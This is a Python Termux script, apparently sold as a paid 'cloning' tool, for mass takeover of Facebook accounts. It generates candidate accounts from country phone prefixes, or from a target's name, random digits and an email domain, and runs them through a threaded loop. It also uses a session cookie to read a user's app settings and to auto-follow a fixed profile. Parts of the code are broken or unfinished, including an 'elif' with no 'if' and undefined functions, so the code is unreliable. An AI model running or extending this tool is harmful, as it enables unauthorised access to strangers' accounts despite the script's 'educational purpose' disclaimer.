# Facebook: RDX
# Github: RDX-76
from __future__ import absolute_import
from __future__ import print_function
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
import array
import requests
import hashlib
import threading
import smtplib

try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures bs4==2 > /dev/null')
	os.system('pip install bs4')
    

def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
	else:
		print(f'\r[Done] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
		for i in range(len(game)):
			print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
		#else:
			#print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
	else:
		print(f'\r[Done] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
		for i in range(len(game)):
			print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
		else:
			print('')

def follow(self, session, coki):
		r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
			'cookie': coki }, **('cookies',)).text, 'html.parser')
		get = r.find('a', 'Ikuti', **('string',)).get('href')
		session.get('https://mbasic.facebook.com' + str(get), {
			'cookie': coki }, **('cookies',)).text
            
def exit():
	os.system('clear')
	print('\x1b[1;96mI Hope You Enjoyed It')
	jalan('\x1b[1;92mThanks For Using This Tool')
	os.sys.exit()  

class jalan:
	def __init__(self, z):
		for e in z + "\n":
			sys.stdout.write(e)
			sys.stdout.flush()
			time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
Ya = current.year
Mo = current.month
Da = current.day
today = date.today()



def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)



back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
loop = 0
oks = []
cps = []


def clear():
    os.system('clear')
    print(logo2)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"

ah="RDX-"
imt="-APP=="
ak=" CODE-"
myid=uuid.uuid4().hex[:10].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.rdx -cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.rdx -cov', 'w')
	kok.write(myid+imt)
	kok.close()

def Subscraption():
	os.system('clear')
	print(logo)
	print('		\033[1;92m  Rdx ')
	jalan('		\033[1;92mWelcome  ')
	key1=open('/data/data/com.termux/files/usr/bin/.rdx -cov', 'r').read()
	jalan("Your Key :- "+ak+ah+key1 )
	key1=input('\x1b[1;92mType The Approved key Here :- ')
	os.system('clear')
	print(logo)
	r1=requests.get("https://github.com/Rdx-76/Prof/blob/main/r.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		pre()
	else:
		os.system("clear")
		print(logo)
		jalan("\t \033[1;32m First Get Approval\033[1;37m ")
		time.sleep(1)
		os.system("clear")
		print(logo) 
		print ("")
		print(" \033[1;32mThis Tools Are Not Free So You Need To Get Approval First\033[1;37m\n")
		print(" \033[1;32m Note : First Get Approval Then Enjoy\033[1;37m")
		print ("")
		print(" \x1b[1;91mYour Key is Not Approved ")
		print("")
		print(" Copy And Send The Key To Admin")
		print ("")
		print (" Your Key : " +ak+ah+key1 )
		print ("")
		name = input(" Your Name : ")
		print ("")
		gf = input(" Your gf Name : ")
		print ("")
		lol = input(" Your Your Email : ")
		print ("")
		input(" Press Enter To Send Key")
		time.sleep(3.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
		os.system('am start https://wa.me/+923344706269?text=' + tks)
		Subscraption()        

def Primex():
	os.system('clear')
	print(logo6)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m[1]\x1b[1;92m Approved & Premmium\x1b[1;91m[PAID]')
	time.sleep(0.05)
	print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m[2]\x1b[1;93m Demo Version")
	time.sleep(0.05)
	print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m[3]\x1b[1;96m What Will You Get In The PREMIUM Version???")
	time.sleep(0.05)
	print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m[0]\x1b[1;91m Exit")
	time.sleep(0.05)
	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
	print('\x1b[1;97m«-----------------\x1b[1;97mRdx-76\x1b[1;97m---------------»')
	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
	part()

def part():
	option = input('\n   \033[0;92mCHOOSE OPTION >>>\033[1;37m ')
	if option =='':
		print('\x1b[1;91mFill in correctly')
		Primex()
	elif option =='1':
		Subscraption()
	elif option =='2':
		Rdx3x()
	elif option =='3':
		details()
	elif option =='0':
		exit()



def details():
	os.system('clear')
	print(logo4)
	print("\x1b[1;97m==>\x1b[1;96m[1]\x1b[1;92m  Clone 26 Country Facebook Id ")
	print("\x1b[1;97m==>\x1b[1;96m[2]\x1b[1;92m  Clone Old Facebook Id ")
	print("\x1b[1;97m==>\x1b[1;96m[3]\x1b[1;92m  Brute Force => \033[1:91[Coming Soon] ")
	print("\x1b[1;97m==>\x1b[1;96m[4]\x1b[1;93m  Generate Strong Passwords Automatically For Your Own Account ")
	print("\x1b[1;97m==>\x1b[1;96m[5]\x1b[1;93m  Generate Random Numbers ")
	print("\x1b[1;97m==>\x1b[1;96m[6]\x1b[1;93m  Track Number / E-mail / IP ")
	print('')
	print('')
	print('\x1b[1;96mIf You Want To Get These.Things You Must Pay')
	print('\x1b[1;92m [1] Continue ')
	print('\x1b[1;91m [0] Exit ')
	now = input('\x1b[1;96mSelect :-')
	if now=='1':
		Primex()
	elif now=='0':
		exit()


def pre():
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[1]\x1b[1;93m Cloning Sectioon')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[2]\x1b[1;92m Brute Force => \033[1;91[Coming Soon]')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[3]\x1b[1;92m Track Number / E-mail / IP ')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[4]\x1b[1;92m Generate Strong Passwords / Number Randomly ')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[5]\x1b[1;94m Rdx   Serch On Facebook   ')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[6]\x1b[1;96m Rdx  Serch On Youtube   ')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[0]\x1b[1;91m Exit             ')
	logx()


def logx():
	elif peak =='1':
		login()
	elif peak =='2':
		brutex()
	elif peak =='3':
		track()
	elif peak =='4':
		genx()
	elif peak =='5':
		os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
		pre()
	elif peak =='6':
		os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
		pre()
	elif peak =='0':
		exit()
	else:
		print('\x1b[1;97m[!] Wrong input')
		pre()

def login():
    os.system('clear')
    print(logo1)
    print('\x1b[1;97m«-----------------\x1b[1;96mDisclaimer\x1b[1;97m---------------»')
    time.sleep(0.05)
    print('\x1b[1;95m\x1b[1;91mThis Tool is for Educational Purpose   ')
    time.sleep(0.05)
    print('\x1b[1;93m\x1b[1;91mThis presentation is for educational          ')
    time.sleep(0.05)
    print('\x1b[1;93m\x1b[1;91mpurposes ONLY.How you use this information    ')
    time.sleep(0.05)
    print('\x1b[1;93m\x1b[1;91mis your responsibility.I will not be          ')
    time.sleep(0.05)
    print("\x1b[1;93m\x1b[1;91mheld accountable This Tool Or Channel Doesn't")
    time.sleep(0.05)
    print('\x1b[1;93m\x1b[1;91mSupport illegal activities.for any illegal    ')
    time.sleep(0.05)
    print('\x1b[1;93m\x1b[1;91mActivitie This Tool is for Educational Purpose')
    time.sleep(0.05)
    print('\x1b[1;97m«-----------------\x1b[1;92mRdx-76\x1b[1;97m---------------»')
    time.sleep(0.05)
    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[1]\x1b[1;92m Fast Cloning 26 Country fb id \x1b[1;91m[New Update]')
    time.sleep(0.05)
    print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[2]\x1b[1;96m Clone Random Facebook ID ")
    time.sleep(0.05)
    print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[3]\x1b[1;93m Clone  Using E-mail Account \x1b[1;91m[Very Slow] ")
    time.sleep(0.05)
    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[0]\x1b[1;91m Exit             ')
    pilih_login()
	
def pilih_login():
	peak = input('\n   \033[0;92mCHOOSE OPTION >>>\033[1;37m ')
	if peak =='':
		print('\x1b[1;91mFill in correctly')
		pilih_login()
	elif peak =='1':
		Rdx1x()
	elif peak =='2':
		Rdx2x()
	elif peak =='3':
		mail()
	elif peak =='0':
		exit()
	else:
		print('\x1b[1;97m[!] Wrong input')
		exit()
		
def Rdx1x():
	os.system('clear')
	print(logo)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[1]  Bangladesh\x1b[1;97m☆.\x1b[1;92m[14]  Australia')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[2]  USA       \x1b[1;97m☆.\x1b[1;92m[15]  Canda')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[3]  UK        \x1b[1;97m☆.\x1b[1;92m[16]  China')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[4]  India     \x1b[1;97m☆.\x1b[1;92m[17]  Denmark')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[5]  Brazil    \x1b[1;97m☆.\x1b[1;92m[18]  France')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[6]  Japan     \x1b[1;97m☆.\x1b[1;92m[19]  Germany')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[7]  Korea     \x1b[1;97m☆.\x1b[1;92m[20]  Malaysia')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[8]  Italy     \x1b[1;97m☆.\x1b[1;92m[21]  Sri lanka')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[9]  Spain     \x1b[1;97m☆.\x1b[1;92m[22]  Turkey')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[10] Poland    \x1b[1;97m☆.\x1b[1;92m[23]  U.A.E')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[11] Pakistan  \x1b[1;97m☆.\x1b[1;92m[24]  Saudi Arabia')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[12] Indonasia \x1b[1;97m☆.\x1b[1;92m[25]  Israil')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;92m[13] Grecee    \x1b[1;97m☆.\x1b[1;92m[26]  Iran')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m☆.\x1b[1;91m[0]  Back            ')
	time.sleep(0.05)
	action()

def action():
	rdx2x = input('\n   \033[0;92mCHOOSE OPTION >>>\033[1;37m ')
	if rdx2x =='':
		print('[!] Fill in correctly')
		action()
	elif rdx2x =="1":
		print(logo53)
		os.system("clear")
		bd()
	elif rdx2x =="2":
		print(logo53)
		os.system("clear")
		usa()
	elif rdx2x =="3":
		print(logo53)
		os.system("clear")
		uk()
	elif rdx2x =="4":
		print(logo53)
		os.system("clear")
		india()
	elif rdx2x =="5":
		print(logo53)
		os.system("clear")
		brazil()
	elif rdx2x =="6":
		print(logo53)
		os.system("clear")
		japan()
	elif rdx2x =="7":
		print(logo53)
		os.system("clear")
		korea()
	elif rdx2x =="8":
		print(logo53)
		os.system("clear")
		italy()
	elif rdx2x =="9":
		print(logo53)
		os.system("clear")
		spain()
	elif rdx2x =="10":
		print(logo53)
		os.system("clear")
		poland()
	elif rdx2x =="11":
		print(logo53)
		os.system("clear")
		pak()
	elif rdx2x =="12":
		print(logo53)
		os.system("clear")
		indonesia()
	elif rdx2x =="13":
		print(logo53)
		os.system("clear")
		greece()
	elif rdx2x =="14":
		print(logo53)
		os.system("clear")
		australia()
	elif rdx2x =="15":
		print(logo53)
		os.system("clear")
		canada()
	elif rdx2x =="16":
		print(logo53)
		os.system("clear")
		china()
	elif rdx2x =="17":
		print(logo53)
		os.system("clear")
		denmark()
	elif rdx2x =="18":
		print(logo53)
		os.system("clear")
		france()
	elif rdx2x =="19":
		print(logo53)
		os.system("clear")
		germany()
	elif rdx2x =="20":
		print(logo53)
		os.system("clear")
		malaysia()
	elif rdx2x =="21":
		print(logo53)
		os.system("clear")
		sri()
	elif rdx2x =="22":
		print(logo53)
		os.system("clear")
		turkey()
	elif rdx2x =="23":
		print(logo53)
		os.system("clear")
		uae()
	elif rdx2x =="24":
		print(logo53)
		os.system("clear")
		saudi()
	elif rdx2x =="25":
		print(logo53)
		os.system("clear")
		israel()
	elif rdx2x =="26":
		print(logo53)
		os.system("clear")
		iran()
	elif rdx2x =='0':
		login()
	else:
		print('[!] Fill in correctly')
		action()


def bd():
	print(logo7)
	print("\x1b[1;97m0175,0165,0191, 0192, 0193, 0194, 0195, 017,019,013,014,016,170,180,190,150,015,130,140,018,0196, 0197, 0198, 0199")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+880"
		os.system('clear')
		print(logo53)
		os.system('clear')
		print(logo7)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def usa():
	print(logo8)
	print("\x1b[1;97m555,786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+1"
		os.system('clear')
		print(logo)
		print(logo8)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def uk():
	print(logo9)
	print("\x1b[1;97m715,785,765,725,745,735,737, 706, 748, 783, 739, 759, 790")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+44"
		os.system('clear')
		print(logo)
		print(logo9)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def india():
	print(logo10)
	print("\x1b[1;97m905,975,755,855,954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+91"
		os.system('clear')
		print(logo)
		print(logo10)
		main()
	except IOError:
		print ("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def brazil():
	print(logo11)
	print("\x1b[1;97m127, 179, 117, 853, 318, 219, 834, 186, 479, 113")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+55"
		os.system('clear')
		print(logo)
		print(logo11)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def japan():
	print(logo12)
	print("\x1b[1;97m11, 12, 19, 16, 15, 13, 14, 18, 17")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+81"
		os.system('clear')
		print(logo)
		print(logo12)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def korea():
	print(logo13)
	print("\x1b[1;97m1, 2, 3, 4, 5, 6, 7, 8, 9")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+82"
		os.system('clear')
		print(logo)
		print(logo13)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def italy():
	print(logo14)
	print("\x1b[1;97m311,323,385,388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+39"
		os.system('clear')
		print(logo)
		print(logo14)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def spain():
	print(logo15)
	print("\x1b[1;97m655,755,60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+34"
		os.system('clear')
		print(logo)
		print(logo15)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def poland():
	print(logo16)
	print("\x1b[1;97m66, 69, 78, 79, 60, 72, 67, 53, 51")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+48"
		os.system('clear')
		print(logo)
		print(logo16)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def pak():
	print(logo17)
	print("\x1b[1;97m01, ~to~~, 49")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+923"
		os.system('clear')
		print(logo)
		print(logo17)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def indonesia():
	print(logo18)
	print("\x1b[1;97m81,83,85,84,89,")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+880"
		os.system('clear')
		print(logo)
		print(logo18)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def greece():
	print(logo19)
	print("\x1b[1;97m(leave the first four digits and the last seven digits of any phone number in this country.Write the remaining digits here.69,693,698,694,695")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+3069"
		os.system('clear')
		print(logo)
		print(logo19)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def australia():
	print(logo20)
	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.455")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+61"
		os.system('clear')
		print(logo)
		print(logo20)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def canada():
	print(logo21)
	print("\x1b[1;97m(leave the first one digits and the last seven digits of any phone number in this country.Write the remaining digits here.555,")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+1"
		os.system('clear')
		print(logo)
		print(logo21)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def china():
	print(logo22)
	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.1355,1555,1855,")
	try:
		code = input(" \x1b[1;97mchoose code  : ")
		k="+86"
		os.system('clear')
		print(logo)
		print(logo22)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def denmark():
	print(logo23)
	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.2,3,4,5,6,7,8")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+45"
		os.system('clear')
		print(logo)
		print(logo23)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def france():
	print(logo24)
	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.65,70,73,74,76,77")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+33"
		os.system('clear')
		print(logo)
		print(logo24)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def germany():
	print(logo25)
	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.151,152,153,155,157,159,160,162,179,163,174,163")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+49"
		os.system('clear')
		print(logo)
		print(logo25)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def malaysia():
	print(logo26)
	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.11,12,13,14,15,16,17,18,19")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+60"
		os.system('clear')
		print(logo)
		print(logo26)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def sri():
	print(logo27)
	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.71,72,73,74,75,76,77,78")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+94"
		os.system('clear')
		print(logo)
		print(logo27)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def turkey():
	print(logo28)
	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.55,54,53,52,50")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+90"
		os.system('clear')
		print(logo)
		print(logo28)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def uae():
	print(logo29)
	print("\x1b[1;97m(leave the first tree digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,55,58,54,56")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+971"
		os.system('clear')
		print(logo)
		print(logo29)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def saudi():
	print (logo30)
	print("\x1b[1;97m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,51,52,53,54,55,56,57,58,")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+966"
		os.system('clear')
		print(logo)
		print(logo30)
		main()
	except IOError:
		print ("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def israel():
	print(logo31)
	print("\x1b[1;97m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here. 52,55")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+972"
		os.system('clear')
		print(logo)
		print(logo31)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()

def iran():
	print(logo32)
	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.990,915,901,933,938,902")
	try:
		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
		k="+98"
		os.system('clear')
		print(logo)
		print(logo32)
		main()
	except IOError:
		print("[!] File Not Found")
		input("\n[ Back ]")
		Rdx1x()



def mail():
	user=[]
	os.system('clear')
	print(logo)
	print("\033[1;92mWHAT IS YOUR NAME?")
	name=input("\033[1;92mUSER NAME : \033[1;92m")
	os.system('clear')
	print(logo36)
	limit = int(input('\033[1;92m[✔]EXAMPLE: 3000, 5000, 15000, 20000\n\033[1;92mCHOOSE CLONING LIMIT : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
		user.append(nmp)
	os.system('clear')
	print(logo33)
	code = input('\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]TERGET FARST NAME: ')
	codex = input('\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]TERGET LAST NAME :  ')
	print('\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]example Doamin :\033[1;93m@gmail.com,\033[1;96m@yahoo.com ')
	doamin = input('\033[1;96m[\033[1;93m📧\033[1;96m]\033[1;94mINPUT DOMING : ')
	with ThreadPool(max_workers=50) as manshera:
		os.system('clear')
		print(logo33)
		tl = str(len(user))
		jalan('\033[1;97m====================================================')
		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Slow Speed Cloning')
		jalan('\033[1;97m====================================================')
		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mFirst Name       \033[1;34m: \033[0;97m"+code)
		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mLast Name       \033[1;34m: \033[0;97m"+codex)
		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
		print ('')
		for co in user:
			uid = code+codex+co+doamin
